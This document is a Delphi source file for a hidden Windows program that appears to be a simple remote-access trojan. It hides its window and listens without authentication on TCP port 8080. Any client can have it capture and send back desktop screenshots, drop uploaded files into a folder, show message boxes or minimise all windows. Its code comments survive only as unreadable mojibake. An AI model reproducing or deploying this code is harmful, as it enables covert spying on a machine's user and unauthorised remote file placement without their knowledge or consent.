unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, IdBaseComponent, IdComponent, IdTCPServer, pngimage,
  IdIPWatch,shellapi;

type
  TForm1 = class(TForm)
    IdTCPServer1: TIdTCPServer;
    IdIPWatch1: TIdIPWatch;
    //procedure Button1Click(Sender: TObject);
    procedure IdTCPServer1Execute(AThread: TIdPeerThread);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    procedure GET_SCREEN;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}


procedure TForm1.GET_SCREEN;
var
  Desktop: TCanvas;
  B: TBitmap;
  W, H :Integer;

  PNG: TPNGObject;

  Kursor:TPoint;
  TempRect:TRect;
begin
 //������ ���������� �������
 GetCursorPos(Kursor);
 //��������� ������ ������
 W:=Screen.Width;
 //��������� ������ ������
 H:=screen.Height;
 //������ ���������� ������� � ������ TRect, ���
 //���� ��������������� ������ �� �������
 TempRect:=Rect(Kursor.x,Kursor.y,Kursor.x+10,Kursor.y+10);

 B:=TBitmap.Create;
 B.Width:=W;
 B.Height:=H;

 Desktop:=TCanvas.Create;
 try
  with Desktop do
   Handle := GetWindowDC(GetDesktopWindow);
   with B.Canvas do
    begin
     Brush.Color:=clGreen;
     //�������� ������� ������
     CopyRect (Rect (0, 0, w, h),
               DeskTop,
               Rect (0, 0, w, h));
     //������� ������� ������ �������
     FillRect(TempRect);
    end;

  //������������ �������� � ������ .png
  PNG := TPNGObject.Create;
  PNG.Assign(B);
  //�������� ������ � ����� ��������
  PNG.SaveToFile(ExtractFilePath(Application.ExeName)+'\'+'s.png');
 //"�������" ���� ����
 finally
  DeskTop.Free;
  B.Free;
  PNG.Free;
 end;
end;

procedure TForm1.IdTCPServer1Execute(AThread: TIdPeerThread);
var
  z,a: string;
  fname:string;
  FS:TFileStream;
  fstream:TFileStream;


  K:TPoint;
   function EnumMiniProc(Wnd : HWND; Param : Longint) : Boolean; stdcall;
begin
  Result := True;
  if (Wnd = Param) or (Wnd = Application.Handle) then
    Exit
  else if isWindowVisible(Wnd) and not isIconic(Wnd) and isWindow(Wnd) then
                            CLOSEWindow(Wnd);
end;
begin



  with AThread.Connection do
  begin
   //������, �� ������� �볺��
   z := ReadLn;
   if SameText(Copy(z, 1, 7), 'remark ') then
   begin
   a:=Copy(z, 7, length(z));
   MessageBox(Handle,PChar(a),PChar('����������'),MB_SYSTEMMODAL);

   end;
       if SameText(Copy(z, 1, 5), 'FILE ') then
   begin
   fname:=Copy(z, 6, length(z));


  FS := TFileStream.Create(ExtractFilePath(Application.ExeName)+'\'+'Downloads'+'\'+ExtractFileName(FName), fmCreate); // ����������
  try
    AThread.Connection.ReadStream(FS, -1, True); // ����� ������������ ��������
  finally
    FreeAndNil(FS);;
  end;

  



   end;

   //���� �������,�� �����������
   if SameText(Copy(z, 1, 11), 'get_screen ') then
   begin
    GET_SCREEN;
    //��������� �����
    fStream := TFileStream.Create(ExtractFilePath(Application.ExeName)+'\'+'s.png',
                                  fmOpenRead	+ fmShareDenyNone);
    //�������� ��� ���� �볺���
    OpenWriteBuffer;
    WriteStream(fStream);
    CloseWriteBuffer;
    //��������� �����
    FreeAndNil(fStream);
   end;



   if SameText(Copy(z, 1, 17), 'message_for_you1 ') then
   begin
    enumwindows (@enumminiproc, 0);  //�������� �� ����

   end;

  //��������� ������ � �볺����
  AThread.Connection.Disconnect;
 end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
Application.ShowMainForm:=False;
 if IdTCPServer1.Active=false then
  begin
   IdTCPServer1.Bindings.Add;
   IdTCPServer1.Bindings.Items[0].IP:= IdIPWatch1.LocalIP;
   IdTCPServer1.Bindings.Items[0].Port:=8080;   //����, ���� ������ ��������������� �� �������������
   IdTCPServer1.Active:=true;
  end
 else
  begin
   IdTCPServer1.Active:=false;
   IdTCPServer1.Bindings.Delete(0);
  end;
end;

end.
